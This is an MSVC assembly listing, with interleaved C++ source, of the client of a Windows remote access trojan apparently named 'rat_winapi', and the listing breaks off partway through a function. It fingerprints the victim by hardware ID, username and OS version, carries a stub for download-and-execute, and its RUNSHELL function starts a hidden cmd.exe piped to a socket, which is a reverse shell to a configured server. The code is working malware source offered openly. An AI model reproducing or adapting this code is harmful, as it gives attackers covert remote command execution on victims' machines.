; Listing generated by Microsoft (R) Optimizing Compiler Version 19.00.24215.1 

	TITLE	c:\users\kote\documents\github\rat_winapi\client\client\source.cpp
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB OLDNAMES

PUBLIC	??_C@_0BJ@PBINOLON@?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$AA@ ; `string'
PUBLIC	??_C@_08FOJKHHJA@?$CFd?4?$CFd?4?$CFd?$AA@	; `string'
PUBLIC	??_C@_0BA@PECNAFNM@127?4000?4000?4001?$AA@	; `string'
PUBLIC	??_C@_07OABLOBDI@ComSpec?$AA@			; `string'
PUBLIC	??_C@_04MKNBDEPB@exit?$AA@			; `string'
PUBLIC	??_C@_09FLKFJBLM@ntdll?4dll?$AA@		; `string'
PUBLIC	??_C@_0BP@PEOALDAJ@RtlGetCompressionWorkSpaceSize?$AA@ ; `string'
PUBLIC	??_C@_0BC@EFLLFMHP@RtlCompressBuffer?$AA@	; `string'
EXTRN	__imp__closesocket@4:PROC
EXTRN	__imp__CreateProcessA@40:PROC
EXTRN	_strstr:PROC
EXTRN	_memset:PROC
EXTRN	__imp__GetProcAddress@8:PROC
EXTRN	__imp__wsprintfA:PROC
EXTRN	__imp__CreateThread@24:PROC
EXTRN	__imp__LoadLibraryA@4:PROC
EXTRN	__imp__WSAStartup@8:PROC
EXTRN	__imp__GetUserNameA@8:PROC
EXTRN	__imp__inet_addr@4:PROC
EXTRN	__imp__GetLastError@0:PROC
EXTRN	__imp__Sleep@4:PROC
EXTRN	__imp__send@16:PROC
EXTRN	__imp__socket@12:PROC
EXTRN	__imp__GetAdaptersInfo@8:PROC
EXTRN	__imp__connect@12:PROC
EXTRN	__imp__WaitForSingleObject@8:PROC
EXTRN	__imp__GetEnvironmentVariableA@12:PROC
EXTRN	__imp__PeekNamedPipe@24:PROC
EXTRN	__imp__CreatePipe@16:PROC
EXTRN	__imp__recv@16:PROC
EXTRN	__imp__TerminateProcess@8:PROC
EXTRN	__imp__WriteFile@20:PROC
EXTRN	__imp__htons@4:PROC
EXTRN	_memcpy:PROC
EXTRN	__imp__ReadFile@20:PROC
COMM	_Socket:DWORD
_DATA	ENDS
;	COMDAT ??_C@_0BC@EFLLFMHP@RtlCompressBuffer?$AA@
CONST	SEGMENT
??_C@_0BC@EFLLFMHP@RtlCompressBuffer?$AA@ DB 'RtlCompressBuffer', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BP@PEOALDAJ@RtlGetCompressionWorkSpaceSize?$AA@
CONST	SEGMENT
??_C@_0BP@PEOALDAJ@RtlGetCompressionWorkSpaceSize?$AA@ DB 'RtlGetCompress'
	DB	'ionWorkSpaceSize', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_09FLKFJBLM@ntdll?4dll?$AA@
CONST	SEGMENT
??_C@_09FLKFJBLM@ntdll?4dll?$AA@ DB 'ntdll.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_04MKNBDEPB@exit?$AA@
CONST	SEGMENT
??_C@_04MKNBDEPB@exit?$AA@ DB 'exit', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_07OABLOBDI@ComSpec?$AA@
CONST	SEGMENT
??_C@_07OABLOBDI@ComSpec?$AA@ DB 'ComSpec', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@PECNAFNM@127?4000?4000?4001?$AA@
CONST	SEGMENT
??_C@_0BA@PECNAFNM@127?4000?4000?4001?$AA@ DB '127.000.000.001', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_08FOJKHHJA@?$CFd?4?$CFd?4?$CFd?$AA@
CONST	SEGMENT
??_C@_08FOJKHHJA@?$CFd?4?$CFd?4?$CFd?$AA@ DB '%d.%d.%d', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BJ@PBINOLON@?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$AA@
CONST	SEGMENT
??_C@_0BJ@PBINOLON@?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$AA@ DB '%'
	DB	'x%x%x%x%x%x%x%x%x%x%x%x', 00H		; `string'
CONST	ENDS
PUBLIC	_WinMain@16
PUBLIC	_RecvThread@4
PUBLIC	_RUNSHELL@4
PUBLIC	_DLEFUNC@4
PUBLIC	_GETSCREEN@4
PUBLIC	_GetOS
PUBLIC	_GetUsername
PUBLIC	_GetHwid
EXTRN	__chkstk:PROC
; Function compile flags: /Ogspy
; File c:\users\kote\documents\github\rat_winapi\client\client\source.cpp
_TEXT	SEGMENT
_AdapterInfo$ = -10384					; size = 10368
_hwid$ = -16						; size = 100
_CPUInfo$ = 84						; size = 16
_dwBufLen$ = 100					; size = 4
_mac$ = 104						; size = 16
_GetHwid PROC

; 56   : {

  00000	55		 push	 ebp
  00001	8d 6c 24 88	 lea	 ebp, DWORD PTR [esp-120]
  00005	b8 08 29 00 00	 mov	 eax, 10504		; 00002908H
  0000a	e8 00 00 00 00	 call	 __chkstk
  0000f	53		 push	 ebx
  00010	56		 push	 esi

; 57   : 	int CPUInfo[4];
; 58   : 	PIP_ADAPTER_INFO pAdapterInfo;
; 59   : 	IP_ADAPTER_INFO AdapterInfo[16];
; 60   : 	DWORD dwBufLen;
; 61   : 	wchar_t mac[8] = { 0x1, 0x2, 0x1, 0x2, 0x1, 0x2, 0x1, 0x2 };

  00011	33 c9		 xor	 ecx, ecx

; 62   : 	__cpuid(CPUInfo, 0);
; 63   : 	dwBufLen = sizeof(AdapterInfo);

  00013	c7 45 64 80 28
	00 00		 mov	 DWORD PTR _dwBufLen$[ebp], 10368 ; 00002880H
  0001a	41		 inc	 ecx
  0001b	8d 75 54	 lea	 esi, DWORD PTR _CPUInfo$[ebp]
  0001e	6a 02		 push	 2
  00020	58		 pop	 eax
  00021	66 89 45 6a	 mov	 WORD PTR _mac$[ebp+2], ax
  00025	66 89 45 6e	 mov	 WORD PTR _mac$[ebp+6], ax
  00029	66 89 45 72	 mov	 WORD PTR _mac$[ebp+10], ax
  0002d	66 89 45 76	 mov	 WORD PTR _mac$[ebp+14], ax
  00031	33 c0		 xor	 eax, eax
  00033	66 89 4d 68	 mov	 WORD PTR _mac$[ebp], cx
  00037	66 89 4d 6c	 mov	 WORD PTR _mac$[ebp+4], cx
  0003b	66 89 4d 70	 mov	 WORD PTR _mac$[ebp+8], cx
  0003f	66 89 4d 74	 mov	 WORD PTR _mac$[ebp+12], cx
  00043	33 c9		 xor	 ecx, ecx
  00045	0f a2		 cpuid
  00047	89 06		 mov	 DWORD PTR [esi], eax

; 64   : 	GetAdaptersInfo(AdapterInfo, &dwBufLen);

  00049	8d 45 64	 lea	 eax, DWORD PTR _dwBufLen$[ebp]
  0004c	50		 push	 eax
  0004d	8d 85 70 d7 ff
	ff		 lea	 eax, DWORD PTR _AdapterInfo$[ebp]
  00053	89 5e 04	 mov	 DWORD PTR [esi+4], ebx
  00056	89 4e 08	 mov	 DWORD PTR [esi+8], ecx
  00059	50		 push	 eax
  0005a	89 56 0c	 mov	 DWORD PTR [esi+12], edx
  0005d	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__GetAdaptersInfo@8
  00063	5e		 pop	 esi

; 65   : 	pAdapterInfo = AdapterInfo;

  00064	8d 95 70 d7 ff
	ff		 lea	 edx, DWORD PTR _AdapterInfo$[ebp]
  0006a	5b		 pop	 ebx
$LL4@GetHwid:

; 66   : 	do
; 67   : 	{
; 68   : 		int i;
; 69   : 		for (i = 0; i < 8; i++)

  0006b	33 c9		 xor	 ecx, ecx
$LL7@GetHwid:

; 70   : 		{
; 71   : 			mac[i] = mac[i] + pAdapterInfo->Address[i];

  0006d	0f b6 84 0a 94
	01 00 00	 movzx	 eax, BYTE PTR [edx+ecx+404]
  00075	66 01 44 4d 68	 add	 WORD PTR _mac$[ebp+ecx*2], ax
  0007a	41		 inc	 ecx
  0007b	83 f9 08	 cmp	 ecx, 8
  0007e	7c ed		 jl	 SHORT $LL7@GetHwid

; 72   : 		}
; 73   : 		pAdapterInfo = pAdapterInfo->Next;

  00080	8b 12		 mov	 edx, DWORD PTR [edx]

; 74   : 	} while (pAdapterInfo);

  00082	85 d2		 test	 edx, edx
  00084	75 e5		 jne	 SHORT $LL4@GetHwid

; 75   : 	char hwid[100];
; 76   : 	memset(hwid, 0, sizeof(hwid));

  00086	6a 64		 push	 100			; 00000064H
  00088	52		 push	 edx
  00089	8d 45 f0	 lea	 eax, DWORD PTR _hwid$[ebp]
  0008c	50		 push	 eax
  0008d	e8 00 00 00 00	 call	 _memset

; 77   : 	wsprintfA(hwid, "%x%x%x%x%x%x%x%x%x%x%x%x",

  00092	0f b7 45 76	 movzx	 eax, WORD PTR _mac$[ebp+14]
  00096	50		 push	 eax
  00097	0f b7 45 74	 movzx	 eax, WORD PTR _mac$[ebp+12]
  0009b	50		 push	 eax
  0009c	0f b7 45 72	 movzx	 eax, WORD PTR _mac$[ebp+10]
  000a0	50		 push	 eax
  000a1	0f b7 45 70	 movzx	 eax, WORD PTR _mac$[ebp+8]
  000a5	50		 push	 eax
  000a6	0f b7 45 6e	 movzx	 eax, WORD PTR _mac$[ebp+6]
  000aa	50		 push	 eax
  000ab	0f b7 45 6c	 movzx	 eax, WORD PTR _mac$[ebp+4]
  000af	50		 push	 eax
  000b0	0f b7 45 6a	 movzx	 eax, WORD PTR _mac$[ebp+2]
  000b4	50		 push	 eax
  000b5	0f b7 45 68	 movzx	 eax, WORD PTR _mac$[ebp]
  000b9	50		 push	 eax
  000ba	ff 75 60	 push	 DWORD PTR _CPUInfo$[ebp+12]
  000bd	8d 45 f0	 lea	 eax, DWORD PTR _hwid$[ebp]
  000c0	ff 75 5c	 push	 DWORD PTR _CPUInfo$[ebp+8]
  000c3	ff 75 58	 push	 DWORD PTR _CPUInfo$[ebp+4]
  000c6	ff 75 54	 push	 DWORD PTR _CPUInfo$[ebp]
  000c9	68 00 00 00 00	 push	 OFFSET ??_C@_0BJ@PBINOLON@?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$CFx?$AA@
  000ce	50		 push	 eax
  000cf	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  000d5	83 c4 44	 add	 esp, 68			; 00000044H

; 78   : 		CPUInfo[0], CPUInfo[1], CPUInfo[2],
; 79   : 		CPUInfo[3], mac[0], mac[1],
; 80   : 		mac[2], mac[3], mac[4],
; 81   : 		mac[5], mac[6], mac[7]);
; 82   : 	return hwid;

  000d8	8d 45 f0	 lea	 eax, DWORD PTR _hwid$[ebp]

; 83   : }

  000db	8d 65 78	 lea	 esp, DWORD PTR [ebp+120]
  000de	5d		 pop	 ebp
  000df	c3		 ret	 0
_GetHwid ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
; File c:\users\kote\documents\github\rat_winapi\client\client\source.cpp
_TEXT	SEGMENT
_username$ = -104					; size = 100
_size$ = -4						; size = 4
_GetUsername PROC

; 86   : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 68	 sub	 esp, 104		; 00000068H

; 87   : 	char username[100];
; 88   : 	DWORD size = UNLEN;
; 89   : 	memset(username, 0, sizeof(username));

  00006	6a 64		 push	 100			; 00000064H
  00008	8d 45 98	 lea	 eax, DWORD PTR _username$[ebp]
  0000b	c7 45 fc 00 01
	00 00		 mov	 DWORD PTR _size$[ebp], 256 ; 00000100H
  00012	6a 00		 push	 0
  00014	50		 push	 eax
  00015	e8 00 00 00 00	 call	 _memset
  0001a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 90   : 	GetUserNameA(username, &size);

  0001d	8d 45 fc	 lea	 eax, DWORD PTR _size$[ebp]
  00020	50		 push	 eax
  00021	8d 45 98	 lea	 eax, DWORD PTR _username$[ebp]
  00024	50		 push	 eax
  00025	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__GetUserNameA@8

; 91   : 	return username;

  0002b	8d 45 98	 lea	 eax, DWORD PTR _username$[ebp]

; 92   : }

  0002e	8b e5		 mov	 esp, ebp
  00030	5d		 pop	 ebp
  00031	c3		 ret	 0
_GetUsername ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
; File c:\users\kote\documents\github\rat_winapi\client\client\source.cpp
_TEXT	SEGMENT
_os$ = -100						; size = 100
_GetOS	PROC

; 95   : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 64	 sub	 esp, 100		; 00000064H

; 96   : 	char os[100];
; 97   : 	PPEBME pPeb = (PPEBME)__readfsdword(0x30);
; 98   : 	memset(os, 0, sizeof(os));

  00006	8d 45 9c	 lea	 eax, DWORD PTR _os$[ebp]
  00009	56		 push	 esi
  0000a	64 8b 35 30 00
	00 00		 mov	 esi, DWORD PTR fs:48
  00011	6a 64		 push	 100			; 00000064H
  00013	6a 00		 push	 0
  00015	50		 push	 eax
  00016	e8 00 00 00 00	 call	 _memset

; 99   : 	wsprintfA(os, "%d.%d.%d", pPeb->NtMajorVersion, pPeb->NtMinorVersion, pPeb->NtBuildNumber);

  0001b	0f b7 86 ac 00
	00 00		 movzx	 eax, WORD PTR [esi+172]
  00022	50		 push	 eax
  00023	ff b6 a8 00 00
	00		 push	 DWORD PTR [esi+168]
  00029	8d 45 9c	 lea	 eax, DWORD PTR _os$[ebp]
  0002c	ff b6 a4 00 00
	00		 push	 DWORD PTR [esi+164]
  00032	68 00 00 00 00	 push	 OFFSET ??_C@_08FOJKHHJA@?$CFd?4?$CFd?4?$CFd?$AA@
  00037	50		 push	 eax
  00038	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  0003e	83 c4 20	 add	 esp, 32			; 00000020H

; 100  : 	return os;

  00041	8d 45 9c	 lea	 eax, DWORD PTR _os$[ebp]
  00044	5e		 pop	 esi

; 101  : }

  00045	8b e5		 mov	 esp, ebp
  00047	5d		 pop	 ebp
  00048	c3		 ret	 0
_GetOS	ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
; File c:\users\kote\documents\github\rat_winapi\client\client\source.cpp
_TEXT	SEGMENT
_param$ = 8						; size = 4
_GETSCREEN@4 PROC

; 105  : 	return 0;

  00000	33 c0		 xor	 eax, eax

; 106  : }

  00002	c2 04 00	 ret	 4
_GETSCREEN@4 ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
; File c:\users\kote\documents\github\rat_winapi\client\client\source.cpp
_TEXT	SEGMENT
_indata$ = -1004					; size = 1004
_url$ = 8						; size = 4
_DLEFUNC@4 PROC

; 109  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec ec 03 00
	00		 sub	 esp, 1004		; 000003ecH
  00009	56		 push	 esi

; 110  : 	char *urlarrdfile = (char*)url;
; 111  : 	CMDiDATA indata; //создаем структуру отвечающую за протокол
; 112  : 	memset(&indata, 0, sizeof(CMDiDATA)); //почистим 

  0000a	be ec 03 00 00	 mov	 esi, 1004		; 000003ecH
  0000f	8d 85 14 fc ff
	ff		 lea	 eax, DWORD PTR _indata$[ebp]
  00015	56		 push	 esi
  00016	6a 00		 push	 0
  00018	50		 push	 eax
  00019	e8 00 00 00 00	 call	 _memset
  0001e	83 c4 0c	 add	 esp, 12			; 0000000cH

; 113  : 	indata.CMD = CMD_OTVET_OK;

  00021	c7 85 14 fc ff
	ff 02 00 00 00	 mov	 DWORD PTR _indata$[ebp], 2

; 114  : 	send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);

  0002b	8d 85 14 fc ff
	ff		 lea	 eax, DWORD PTR _indata$[ebp]
  00031	6a 00		 push	 0
  00033	56		 push	 esi
  00034	50		 push	 eax
  00035	ff 35 00 00 00
	00		 push	 DWORD PTR _Socket
  0003b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__send@16

; 115  : 	return 0;

  00041	33 c0		 xor	 eax, eax
  00043	5e		 pop	 esi

; 116  : }

  00044	8b e5		 mov	 esp, ebp
  00046	5d		 pop	 ebp
  00047	c2 04 00	 ret	 4
_DLEFUNC@4 ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
; File c:\users\kote\documents\github\rat_winapi\client\client\source.cpp
_TEXT	SEGMENT
_lpNumberOfBytesRead$ = -4496				; size = 4
_hPipeRead1$ = -4492					; size = 4
_secu$ = -4488						; size = 12
_hPipeRead2$ = -4476					; size = 4
_hPipeWrite1$ = -4472					; size = 4
_hPipeWrite2$ = -4468					; size = 4
_sin$ = -4464						; size = 16
_pInfo$ = -4448						; size = 16
_sInfo$ = -4432						; size = 68
_szCmdPath$ = -4360					; size = 260
_szBuffer$ = -4096					; size = 4096
_port$ = 8						; size = 4
_RUNSHELL@4 PROC

; 119  : {

  00000	b8 90 11 00 00	 mov	 eax, 4496		; 00001190H
  00005	e8 00 00 00 00	 call	 __chkstk
  0000a	53		 push	 ebx
  0000b	55		 push	 ebp
  0000c	56		 push	 esi
  0000d	57		 push	 edi

; 120  : 	SOCKADDR_IN sin;
; 121  : 	SOCKET shellsock;
; 122  : 	sin.sin_family = AF_INET;

  0000e	6a 02		 push	 2
  00010	5e		 pop	 esi

; 123  : 	sin.sin_port = htons(8080);

  00011	68 90 1f 00 00	 push	 8080			; 00001f90H
  00016	66 89 74 24 34	 mov	 WORD PTR _sin$[esp+4516], si
  0001b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__htons@4

; 124  : 	sin.sin_addr.S_un.S_addr = inet_addr(ADDRSERVER);

  00021	68 00 00 00 00	 push	 OFFSET ??_C@_0BA@PECNAFNM@127?4000?4000?4001?$AA@
  00026	66 89 44 24 36	 mov	 WORD PTR _sin$[esp+4518], ax
  0002b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__inet_addr@4

; 125  : 	shellsock = socket(AF_INET, SOCK_STREAM, 0);

  00031	33 ed		 xor	 ebp, ebp
  00033	89 44 24 34	 mov	 DWORD PTR _sin$[esp+4516], eax
  00037	55		 push	 ebp
  00038	33 db		 xor	 ebx, ebx
  0003a	43		 inc	 ebx
  0003b	53		 push	 ebx
  0003c	56		 push	 esi
  0003d	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__socket@12

; 126  : 
; 127  : 	DWORD lpNumberOfBytesRead;
; 128  : 	SECURITY_ATTRIBUTES secu =
; 129  : 	{
; 130  : 		(DWORD)sizeof(SECURITY_ATTRIBUTES), NULL, TRUE
; 131  : 	};
; 132  : 
; 133  : 	STARTUPINFOA sInfo;
; 134  : 	PROCESS_INFORMATION pInfo;
; 135  : 	HANDLE hPipeRead1, hPipeWrite1, hPipeRead2, hPipeWrite2;
; 136  : 	char szBuffer[4096], szCmdPath[MAX_PATH];
; 137  : 	int i, count = 0;
; 138  : 	CreatePipe(&hPipeRead1, &hPipeWrite1, &secu, 0);

  00043	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR __imp__CreatePipe@16
  00049	8b f8		 mov	 edi, eax
  0004b	55		 push	 ebp
  0004c	8d 44 24 1c	 lea	 eax, DWORD PTR _secu$[esp+4516]
  00050	89 5c 24 24	 mov	 DWORD PTR _secu$[esp+4524], ebx
  00054	50		 push	 eax
  00055	8d 44 24 30	 lea	 eax, DWORD PTR _hPipeWrite1$[esp+4520]
  00059	c7 44 24 20 0c
	00 00 00	 mov	 DWORD PTR _secu$[esp+4520], 12 ; 0000000cH
  00061	50		 push	 eax
  00062	8d 44 24 20	 lea	 eax, DWORD PTR _hPipeRead1$[esp+4524]
  00066	89 6c 24 28	 mov	 DWORD PTR _secu$[esp+4528], ebp
  0006a	50		 push	 eax
  0006b	8b dd		 mov	 ebx, ebp
  0006d	ff d6		 call	 esi

; 139  : 	CreatePipe(&hPipeRead2, &hPipeWrite2, &secu, 0);

  0006f	55		 push	 ebp
  00070	8d 44 24 1c	 lea	 eax, DWORD PTR _secu$[esp+4516]
  00074	50		 push	 eax
  00075	8d 44 24 34	 lea	 eax, DWORD PTR _hPipeWrite2$[esp+4520]
  00079	50		 push	 eax
  0007a	8d 44 24 30	 lea	 eax, DWORD PTR _hPipeRead2$[esp+4524]
  0007e	50		 push	 eax
  0007f	ff d6		 call	 esi

; 140  : 	GetEnvironmentVariableA("ComSpec", szCmdPath, sizeof(szCmdPath));

  00081	68 04 01 00 00	 push	 260			; 00000104H
  00086	8d 84 24 9c 00
	00 00		 lea	 eax, DWORD PTR _szCmdPath$[esp+4516]
  0008d	50		 push	 eax
  0008e	68 00 00 00 00	 push	 OFFSET ??_C@_07OABLOBDI@ComSpec?$AA@
  00093	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__GetEnvironmentVariableA@12

; 141  : 
; 142  : 	memset(&sInfo, 0, sizeof(sInfo));

  00099	6a 44		 push	 68			; 00000044H
  0009b	5e		 pop	 esi
  0009c	56		 push	 esi
  0009d	8d 44 24 54	 lea	 eax, DWORD PTR _sInfo$[esp+4516]
  000a1	55		 push	 ebp
  000a2	50		 push	 eax
  000a3	e8 00 00 00 00	 call	 _memset

; 143  : 	memset(&pInfo, 0, sizeof(pInfo));

  000a8	6a 10		 push	 16			; 00000010H
  000aa	8d 44 24 50	 lea	 eax, DWORD PTR _pInfo$[esp+4528]
  000ae	55		 push	 ebp
  000af	50		 push	 eax
  000b0	e8 00 00 00 00	 call	 _memset
  000b5	83 c4 18	 add	 esp, 24			; 00000018H

; 144  : 	sInfo.cb = sizeof(STARTUPINFOA);

  000b8	89 74 24 50	 mov	 DWORD PTR _sInfo$[esp+4512], esi

; 145  : 	sInfo.dwFlags = STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
; 146  : 	sInfo.wShowWindow = SW_HIDE;

  000bc	33 c0		 xor	 eax, eax
  000be	c7 44 24 7c 01
	01 00 00	 mov	 DWORD PTR _sInfo$[esp+4556], 257 ; 00000101H
  000c6	66 89 84 24 80
	00 00 00	 mov	 WORD PTR _sInfo$[esp+4560], ax

; 147  : 	sInfo.hStdInput = hPipeRead2;

  000ce	8b 44 24 24	 mov	 eax, DWORD PTR _hPipeRead2$[esp+4512]
  000d2	89 84 24 88 00
	00 00		 mov	 DWORD PTR _sInfo$[esp+4568], eax

; 148  : 	sInfo.hStdOutput = hPipeWrite1;

  000d9	8b 44 24 28	 mov	 eax, DWORD PTR _hPipeWrite1$[esp+4512]
  000dd	89 84 24 8c 00
	00 00		 mov	 DWORD PTR _sInfo$[esp+4572], eax

; 149  : 	sInfo.hStdError = hPipeWrite1;

  000e4	89 84 24 90 00
	00 00		 mov	 DWORD PTR _sInfo$[esp+4576], eax

; 150  : 	CreateProcessA(NULL, szCmdPath, &secu, &secu, TRUE, 0, NULL, NULL, &sInfo, &pInfo);

  000eb	8d 44 24 40	 lea	 eax, DWORD PTR _pInfo$[esp+4512]
  000ef	50		 push	 eax
  000f0	8d 44 24 54	 lea	 eax, DWORD PTR _sInfo$[esp+4516]
  000f4	50		 push	 eax
  000f5	55		 push	 ebp
  000f6	55		 push	 ebp
  000f7	55		 push	 ebp
  000f8	6a 01		 push	 1
  000fa	8d 44 24 30	 lea	 eax, DWORD PTR _secu$[esp+4536]
  000fe	50		 push	 eax
  000ff	50		 push	 eax
  00100	8d 84 24 b8 00
	00 00		 lea	 eax, DWORD PTR _szCmdPath$[esp+4544]
  00107	50		 push	 eax
  00108	55		 push	 ebp
  00109	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CreateProcessA@40
  0010f	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR __imp__Sleep@4
  00115	eb 02		 jmp	 SHORT $LN2@RUNSHELL
$LL33@RUNSHELL:
  00117	33 ed		 xor	 ebp, ebp
$LN2@RUNSHELL:

; 151  : 
; 152  : 	while (TRUE)
; 153  : 	{
; 154  : 		if (connect(shellsock, (SOCKADDR*)&sin, sizeof(sin)) == 0)

  00119	6a 10		 push	 16			; 00000010H
  0011b	8d 44 24 34	 lea	 eax, DWORD PTR _sin$[esp+4516]
  0011f	50		 push	 eax
  00120	57		 push	 edi
  00121	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__connect@12
  00127	85 c0		 test	 eax, eax
  00129	0f 85 d6 00 00
	00		 jne	 $LN8@RUNSHELL
$LL4@RUNSHELL:

; 155  : 		{
; 156  : 			while (TRUE)
; 157  : 			{
; 158  : 				Sleep(100);

  0012f	6a 64		 push	 100			; 00000064H
  00131	ff d6		 call	 esi

; 159  : 				memset(szBuffer, 0, sizeof(szBuffer));

  00133	68 00 10 00 00	 push	 4096			; 00001000H
  00138	8d 84 24 a4 01
	00 00		 lea	 eax, DWORD PTR _szBuffer$[esp+4516]
  0013f	55		 push	 ebp
  00140	50		 push	 eax
  00141	e8 00 00 00 00	 call	 _memset
  00146	83 c4 0c	 add	 esp, 12			; 0000000cH

; 160  : 				PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);

  00149	eb 3c		 jmp	 SHORT $LN35@RUNSHELL
$LL6@RUNSHELL:

; 161  : 				while (lpNumberOfBytesRead)
; 162  : 				{
; 163  : 					Sleep(200);

  0014b	68 c8 00 00 00	 push	 200			; 000000c8H
  00150	ff d6		 call	 esi

; 164  : 					if (!ReadFile(hPipeRead1, szBuffer, sizeof(szBuffer), &lpNumberOfBytesRead, NULL)) 

  00152	55		 push	 ebp
  00153	8d 44 24 14	 lea	 eax, DWORD PTR _lpNumberOfBytesRead$[esp+4516]
  00157	50		 push	 eax
  00158	68 00 10 00 00	 push	 4096			; 00001000H
  0015d	8d 84 24 ac 01
	00 00		 lea	 eax, DWORD PTR _szBuffer$[esp+4524]
  00164	50		 push	 eax
  00165	ff 74 24 24	 push	 DWORD PTR _hPipeRead1$[esp+4528]
  00169	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__ReadFile@20
  0016f	85 c0		 test	 eax, eax
  00171	74 2e		 je	 SHORT $LN21@RUNSHELL

; 165  : 						break;
; 166  : 					else
; 167  : 					{
; 168  : 						send(shellsock, szBuffer, lpNumberOfBytesRead, 0);

  00173	55		 push	 ebp
  00174	ff 74 24 14	 push	 DWORD PTR _lpNumberOfBytesRead$[esp+4516]
  00178	8d 84 24 a8 01
	00 00		 lea	 eax, DWORD PTR _szBuffer$[esp+4520]
  0017f	50		 push	 eax
  00180	57		 push	 edi
  00181	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__send@16
$LN35@RUNSHELL:

; 169  : 					}
; 170  : 						
; 171  : 					PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);

  00187	55		 push	 ebp
  00188	8d 44 24 14	 lea	 eax, DWORD PTR _lpNumberOfBytesRead$[esp+4516]
  0018c	50		 push	 eax
  0018d	55		 push	 ebp
  0018e	55		 push	 ebp
  0018f	55		 push	 ebp
  00190	ff 74 24 28	 push	 DWORD PTR _hPipeRead1$[esp+4532]
  00194	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__PeekNamedPipe@24
  0019a	83 7c 24 10 00	 cmp	 DWORD PTR _lpNumberOfBytesRead$[esp+4512], 0
  0019f	75 aa		 jne	 SHORT $LL6@RUNSHELL
$LN21@RUNSHELL:

; 172  : 				}
; 173  : 				
; 174  : 				Sleep(200);

  001a1	68 c8 00 00 00	 push	 200			; 000000c8H
  001a6	ff d6		 call	 esi

; 175  : 
; 176  : 				i = recv(shellsock, szBuffer, sizeof(szBuffer), 0);

  001a8	55		 push	 ebp
  001a9	68 00 10 00 00	 push	 4096			; 00001000H
  001ae	8d 84 24 a8 01
	00 00		 lea	 eax, DWORD PTR _szBuffer$[esp+4520]
  001b5	50		 push	 eax
  001b6	57		 push	 edi
  001b7	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__recv@16
  001bd	8b e8		 mov	 ebp, eax

; 177  : 
; 178  : 				if (shellsock == 0)

  001bf	85 ff		 test	 edi, edi
  001c1	75 0a		 jne	 SHORT $LN13@RUNSHELL

; 179  : 				{
; 180  : 					count++;

  001c3	43		 inc	 ebx

; 181  : 					if (count > 1) break;

  001c4	83 fb 01	 cmp	 ebx, 1
  001c7	0f 8f 4a ff ff
	ff		 jg	 $LL33@RUNSHELL
$LN13@RUNSHELL:

; 182  : 				}
; 183  : 
; 184  : 				if (!strstr(szBuffer, "exit") == 0)

  001cd	8d 84 24 a0 01
	00 00		 lea	 eax, DWORD PTR _szBuffer$[esp+4512]
  001d4	68 00 00 00 00	 push	 OFFSET ??_C@_04MKNBDEPB@exit?$AA@
  001d9	50		 push	 eax
  001da	e8 00 00 00 00	 call	 _strstr
  001df	59		 pop	 ecx
  001e0	59		 pop	 ecx
  001e1	85 c0		 test	 eax, eax
  001e3	75 29		 jne	 SHORT $LN23@RUNSHELL

; 187  : 					goto exit;
; 188  : 				}
; 189  : 
; 190  : 				else 
; 191  : 					WriteFile(hPipeWrite2, szBuffer, i, &lpNumberOfBytesRead, 0);

  001e5	50		 push	 eax
  001e6	8d 44 24 14	 lea	 eax, DWORD PTR _lpNumberOfBytesRead$[esp+4516]
  001ea	50		 push	 eax
  001eb	55		 push	 ebp
  001ec	8d 84 24 ac 01
	00 00		 lea	 eax, DWORD PTR _szBuffer$[esp+4524]
  001f3	50		 push	 eax
  001f4	ff 74 24 3c	 push	 DWORD PTR _hPipeWrite2$[esp+4528]
  001f8	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__WriteFile@20

; 192  : 			}

  001fe	33 ed		 xor	 ebp, ebp
  00200	e9 2a ff ff ff	 jmp	 $LL4@RUNSHELL
$LN8@RUNSHELL:

; 193  : 		}
; 194  : 		else
; 195  : 		{
; 196  : 			Sleep(100);

  00205	6a 64		 push	 100			; 00000064H
